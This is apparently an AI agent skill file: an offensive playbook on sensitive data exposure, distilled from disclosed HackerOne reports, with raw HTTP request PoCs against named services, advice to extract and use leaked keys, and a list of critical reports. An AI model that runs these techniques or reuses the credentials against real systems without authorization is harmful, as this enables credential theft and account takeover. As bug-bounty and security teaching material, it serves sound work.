---
name: sensitive-data-exposure
description: "Sensitive Data Exposure & Credential Storage offensive playbook from 109 disclosed HackerOne reports (13 critical, 18 high, 42 medium, 36 low). Use when hunting or reviewing sensitive data exposure & credential storage. Triggers: information, curl, allowed, credentials, api."
license: "For authorized security testing and education only."
---

# Sensitive Data Exposure & Credential Storage

> Distilled from **109** disclosed HackerOne reports. Real examples and the full
> report list are in [reference.md](reference.md).

## What it is

Secrets and credentials are stored or transmitted insecurely  -  cleartext storage/transport, hard-coded keys, recoverable passwords, secrets in configs/clients.

## Where to hunt

- Inspect client bundles, mobile apps, configs, and API responses for keys/tokens; check whether sensitive data is encrypted in transit and at rest.

## Exploitation playbook

- Extract hard-coded API keys/credentials and use them; capture cleartext credentials in transit.

## Bypass techniques

- Locate secrets in JS source maps, app packages, git history, or verbose responses.

## Impact & escalation

- Direct use of leaked credentials → account/infra takeover.

## Remediation

- Encrypt in transit (TLS) and at rest, hash passwords with a strong KDF, keep secrets server-side in a vault, rotate exposed keys.

## Concrete payloads & PoCs

Extracted from disclosed writeups. Adapt to the target; test only where authorized.

### 1. [#1489892](https://hackerone.com/reports/1489892)  -  All user password hash can be seen from admin panel
*medium*

```http
GET /api/users?page=1&userId=&firstName=test&lastName=&email=&partnerOrg=&highSchool= HTTP/2
Host: hackers.upchieve.org
Cookie: connect.sid=s%3AaF9AzSGty6cZOHNTyahImdIzUoSDCWuB.ofJzU1Tr25W2Kd2unMFlpS66K4VsPtK3YE0xmHvUZGU…
X-Csrf-Token: KeypPQND-ch0LQMIPkTckMoZdYHTBgA4Mha0
X-Requested-With: XMLHttpRequest
```

### 2. [#855618](https://hackerone.com/reports/855618)  -  Account takeover intercepting magic link for Arrive app
*low*

```http
POST /graphql HTTP/1.1
Content-Type: application/json
Cookie: _arrive-server_session=2a969ef15e1cc286ca6c5a88433d7173
Host: arrive-server.shopifycloud.com
Content-Length: 346

{"operationName":"VerifyToken","variables":{"token":"TOKENHERE"},"query":"mutation VerifyToken($token: String!) {\n  verifyToken(token: $token) {\n    user {\n      id\n      __typename\n    }\n    userErrors {\n      field\n      message\n      __typename\n    }\n    __typename\n  }\n}\n"}
```

### 3. [#855618](https://hackerone.com/reports/855618)  -  Account takeover intercepting magic link for Arrive app
*low*

```http
POST /graphql HTTP/1.1
Content-Type: application/json
Host: arrive-server.shopifycloud.com
Content-Length: 293

{"operationName":"SendVerificationEmail","variables":{"email":"EMAILHERE"},"query":"mutation SendVerificationEmail($email: String!) {\n  sendVerificationEmail(email: $email) {\n    userErrors {\n      field\n      message\n      __typename\n    }\n    __typename\n  }\n}\n"}
```

### 4. [#902733](https://hackerone.com/reports/902733)  -  Sensitive Info Leak - An Attacker Can Retrieve All the Users Mobile…
*medium*

```http
POST /api/waitlist/us HTTP/1.1
Host: website-api.production.curve.app
Content-Length: 30
Content-Type: application/json;charset=UTF-8
Origin: https://www.curve.com
Referer: https://www.curve.com/credit?rc=

{"email":"praseudo@gmail.com"}
```

### 5. [#902733](https://hackerone.com/reports/902733)  -  Sensitive Info Leak - An Attacker Can Retrieve All the Users Mobile…
*medium*

```http
POST /api/waitlist/us HTTP/1.1
Host: website-api.production.curve.app
Content-Length: 30
Content-Type: application/json;charset=UTF-8
Origin: https://www.curve.com
Referer: https://www.curve.com/credit?rc=
```

### 6. [#1547048](https://hackerone.com/reports/1547048)  -  CVE-2022-27776: Auth/cookie leak on redirect
*medium*

```http
GET / HTTP/1.1
Host: hostname.tld:9999
Authorization: secrettoken
Cookie: secretcookie
```

More payloads: see [payloads.md](payloads.md) (67 curated).

## Recurring patterns in this dataset

Most frequent terms across the 109 reports (term (count)): `information` (29), `curl` (26), `allowed` (26), `credentials` (25), `api` (24), `access` (24), `password` (24), `sensitive` (24), `key` (23), `file` (22), `hsts` (22), `attacker` (20), `database` (19), `leak` (18), `passwords` (16), `github` (15), `log` (14), `through` (14)

## Worked example  -  [report #716292](https://hackerone.com/reports/716292)

*JumpCloud API Key leaked via Open Github Repository.* (critical,  - )

> Summary: Open Github Repo Leaking Starbucks JumbCloud API Key Description: Team, While going through Github search I discovered a public repository which contains Jumbcloud API Key of Starbucks. Repo: https://github.com/██████████/Project. File: https://github.com/████/Project/blob/0d56bb910923da2fbee95971778923f734a25f68/getSystemUsers.go POC List systems There are multiple AWS instances present SSO Applications AWS login SAM config is presents. This would leads to AWS account takeover Impact This issue impact is critical as through this API anyone could Execute commands on systems https://docs.jumpcloud.com/1.0/commands/create-a-command Add/Remove users which has access to internal system…

## Top disclosed examples

| Report | Severity | Bounty | Program | Title |
| :-- | :-- | :-- | :-- | :-- |
| [#716292](https://hackerone.com/reports/716292) | critical |  -  | starbucks | JumpCloud API Key leaked via Open Github Repository. |
| [#396467](https://hackerone.com/reports/396467) | critical |  -  | snapchat | Github Token Leaked publicly for https://github.sc-corp.net |
| [#979787](https://hackerone.com/reports/979787) | critical |  -  | gitlab | Able to view hackerone reports attachments |
| [#1266188](https://hackerone.com/reports/1266188) | critical |  -  | elastic | Critical \|\| Unrestricted access to private Github repos and properties of Elastic thr… |
| [#3419636](https://hackerone.com/reports/3419636) | critical |  -  | lemlist | Authentication Token Theft via Open Redirect in Callback URL Parameter |
| [#817331](https://hackerone.com/reports/817331) | critical |  -  | mtn_group | Weak/Auto Fill Password |
| [#1639600](https://hackerone.com/reports/1639600) | critical |  -  | slack | Hashed data exposure via WebSockets to Workspace Members |
| [#1703733](https://hackerone.com/reports/1703733) | critical |  -  | mtn_group | Exposure Of Admin Username & Password |

*See [reference.md](reference.md) for all 109 reports in this class.*
